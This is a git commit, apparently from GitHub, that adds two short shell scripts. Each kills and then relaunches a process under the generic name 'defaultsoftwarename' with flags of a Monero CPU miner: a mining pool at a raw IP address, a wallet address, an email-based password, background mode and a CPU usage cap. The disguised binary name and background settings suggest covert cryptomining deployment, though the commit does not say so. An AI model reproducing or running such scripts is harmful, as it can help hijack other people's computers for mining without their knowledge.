f73786cef1c783980bfd33a0c6c9645f418b0ecb
oleg7zosimov <64284600+oleg7zosimov@users.noreply.github.com>
2020-04-26 14:40:48 +0300

    Add files via upload

---
+++ 1.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 87.98.181.41:49228 -u 44u46bXV3ZycXnVxUyraNY2svyjg9qfm7ecQ79sSkusiJ2KvCwftQbQLY76HzeYnb2TY3TjbdYWGxjUvpURgAbG8Qrbqiie --pass=x:oleg7zosimov@gmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=74 --av=1
---
+++ 6.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 87.98.181.41:49000 -u 44u46bXV3ZycXnVxUyraNY2svyjg9qfm7ecQ79sSkusiJ2KvCwftQbQLY76HzeYnb2TY3TjbdYWGxjUvpURgAbG8Qrbqiie --pass=x:oleg7zosimov@gmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=81 --av=1
